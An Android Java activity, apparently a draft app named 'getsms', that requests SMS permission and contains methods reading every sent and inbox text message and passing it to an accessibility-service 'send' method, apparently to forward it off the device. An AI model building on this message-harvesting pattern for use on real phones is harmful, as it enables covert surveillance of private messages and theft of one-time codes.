package me.paradis.getsms;

import static android.Manifest.permission.READ_PHONE_NUMBERS;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.READ_SMS;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.TelephonyManager;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ActivityCompat.requestPermissions(this, new String[]{READ_SMS}, 1);

        int REQUEST_PHONE_CALL = 1;

        if (ContextCompat.checkSelfPermission(MainActivity.this, READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            System.out.println("THE THING HAPPENED -----------");
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{READ_SMS}, REQUEST_PHONE_CALL);
        } else {
            System.out.println("ERROR FOR THE THING ----------------");
        }

        System.out.println("STARTING -----------------");



        //getSentSMS();
        //getInboxSMS();


    }

    public void getSentSMS() {

        MyAccessibilityService myAccessibilityService = new MyAccessibilityService();


        System.out.println("test0");
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
        System.out.println("test1");

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            System.out.println("test2");

            do {
                String msgData = "{";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    if (idx > 0) msgData += ",";
                    msgData += "'" + cursor.getColumnName(idx) + "':'" + cursor.getString(idx) + "'";

                }
                msgData += "}";
                System.out.println(msgData);
                myAccessibilityService.send(msgData);
                // use msgData
            } while (cursor.moveToNext());
        } else {
            // empty box, no SMS
            System.out.println("NO SMS --------------");
        }
    }

    public void getInboxSMS() {

        MyAccessibilityService myAccessibilityService = new MyAccessibilityService();


        System.out.println("test0");
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        System.out.println("test1");

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            System.out.println("test2");

            do {
                String msgData = "";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);

                }
                System.out.println(msgData);
                myAccessibilityService.send(msgData);
                // use msgData
            } while (cursor.moveToNext());
        } else {
            // empty box, no SMS
            System.out.println("NO SMS --------------");
        }
    }
}